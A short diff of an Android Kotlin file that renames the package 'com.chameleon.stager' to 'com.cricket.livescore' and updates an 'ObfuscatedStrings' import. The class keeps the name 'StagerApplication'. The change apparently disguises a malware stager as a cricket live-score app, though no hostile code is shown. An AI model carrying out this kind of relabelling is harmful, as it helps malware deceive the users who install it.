@@ -1,8 +1,8 @@
-package com.chameleon.stager
+package com.cricket.livescore
 
 import android.app.Application
 import android.content.Context
-import com.chameleon.stager.utils.ObfuscatedStrings
+import com.cricket.livescore.utils.ObfuscatedStrings
 
 class StagerApplication : Application() {
     companion object {
